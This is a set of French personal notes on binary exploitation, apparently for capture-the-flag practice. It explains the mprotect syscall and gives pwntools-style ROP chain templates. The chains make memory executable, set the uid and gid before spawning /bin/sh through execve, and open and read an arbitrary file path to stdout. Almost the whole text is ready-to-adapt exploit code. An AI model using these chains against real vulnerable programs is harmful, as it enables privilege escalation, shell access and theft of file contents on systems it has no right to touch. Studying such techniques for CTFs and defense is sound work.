# Notes Pwn

## Utilisation de  *mprotect()*
`$int mprotect(void *addr, size_t len, int prot);`


* **addr** : L'adresse de début de la région de mémoire dont tu veux changer les permissions. Cette adresse doit être alignée sur une limite de page (généralement 4096 octets sur les systèmes x86-64).
* **len** : La taille de la région de mémoire.
* **prot** : Les nouvelles protections que tu veux appliquer à la région. Les valeurs possibles pour prot incluent :
 * **PROT_EXEC** : Permet l'exécution du code.
 * **PROT_READ** : Permet la lecture.
 * **PROT_WRITE** : Permet l'écriture.
 * **PROT_NONE** : Interdit l'accès à la mémoire.

### En assembleur:

```
mov rax, 0xa            ; numéro du syscall pour mprotect sur x86-64
mov rdi, <adresse>       ; adresse de la région mémoire à modifier
mov rsi, <taille>        ; taille de la région (doit être un multiple de la taille de page)
mov rdx, 0x7            ; protections: PROT_READ | PROT_WRITE | PROT_EXEC
syscall                 ; appel du syscall
```
### avec des : pop *registre* ; ret
Les adresses des pop sont trouvées avec ROPGadget
```
ROPCHAIN = p64(pop_rdi) + p64(0x00000000006bc000) #adresse du début de la zone mémoire
					+ p64(pop_rdx) + p64(0x7) #les droits rwx
					+ p64(pop_rsi) + p64(0x1000)  #1 page entière qui sera en rwx
					+ p64(pop_rax) + p64(0xa) #num syscall 
					+ p64(syscall_ret)
```

## ROPchain d'un execve() avec le uid et gid d'un utilisateur
Le but est de lancer un shell avec les droits particulier d'un l'utilisateur.


```
	ROPChain = (
	p64(pop_rax) + p64(105) +           # setuid syscall numéro 105
	p64(pop_rdi) + p64(126) +           #uid = 126
	p64(syscall_ret) +
	
	p64(pop_rax) + p64(106) +           # setgid syscall numéro 106
	p64(pop_rdi) + p64(138) +           # gid = 138
	p64(syscall_ret) +
	
	#Chargement de la chaîne "/bin/sh" en mémoire
	p64(pop_rdx) + b'/bin/sh\x00' +     # Charger la chaîne dans RDX
	p64(pop_rax) + p64(0x006b6000) +  # adresse mémoire de "/bin/sh"
	p64(write_gadget) +                 # Écrire "/bin/sh" en mémoire
	#write_gadget = mov qword ptr [rax], rdx ; ret
	
	#Appel à execve("/bin/sh", NULL, NULL)
	p64(pop_rax) + p64(0x3b) +          # execve syscall number 59
	p64(pop_rdi) + p64(0x006b6000) +  # Charger l'adresse de "/bin/sh" dans RDI
	p64(pop_rsi) + p64(0x0) +           # Argument: argv = NULL
	p64(pop_rdx) + p64(0x0) +           # Argument: envp = NULL
	p64(syscall)                        # Syscall: execve("/bin/sh", NULL, NULL)
)
```

## Lire un fichier (chemin absolu)

```
ROPChain = (
	#ecriture du nom de fichier en memoire
	p64(pop_rdx) + b'/home/ka' +
	p64(pop_rax) + p64(0x006b6000) +  # Adresse où stocker le nom du fichier
	p64(write_gadget) +                       # Écriture en mémoire
	
	p64(pop_rdx) + b'li/Deskt' + 
	p64(pop_rax) + p64(0x006b6008) + #On décalle de 8 l adresse
	p64(write_gadget) +
	
	p64(pop_rdx) + b'op/monfi' + 
	p64(pop_rax) + p64(0x006b6010) +
	p64(write_gadget) +
	
	p64(pop_rdx) + b'chier\x00\x00\x00' + 
	p64(pop_rax) + p64(0x006b6018) +
	p64(write_gadget) +
	
	# 2. Appel à open("/home/kali/Desktop/monfichier", O_RDONLY)
	p64(pop_rax) + p64(2) + # Syscall open: numéro 2
	p64(pop_rdi) + p64(0x006b6000) +  # Argument: chemin du fichier
	p64(pop_rsi) + p64(0) +                   # Argument: O_RDONLY (flag 0)
	p64(syscall_ret) +                            # Syscall: open(fichier, O_RDONLY)
	
	# 3. Appel à read(fd, buffer, size)
	p64(pop_rdi) + p64(3) +                   # Argument: file descriptor retourné par open
	p64(pop_rsi) + p64(0x006b7000) +  # Adresse du buffer pour lire le fichier
	p64(pop_rdx) + p64(100) +                 # Lire 100 octets
	p64(pop_rax) + p64(0) +                   # Syscall read: numéro 0
	p64(syscall_ret) +                            # Syscall: read(fd, buffer, 100)
	
	# 4. Appel à write(1, buffer, size)
	p64(pop_rdi) + p64(1) +                   # Argument:  sortie (1 = stdout)
	p64(pop_rsi) + p64(0x006b7000) +  # Adresse du buffer où le contenu est stocké
	p64(pop_rdx) + p64(100) +                 # Taille à écrire (100 octets)
	p64(pop_rax) + p64(1) +                   # Syscall write: numéro 1
	p64(syscall)                              # Syscall: write(1, buffer, 100)
)
```
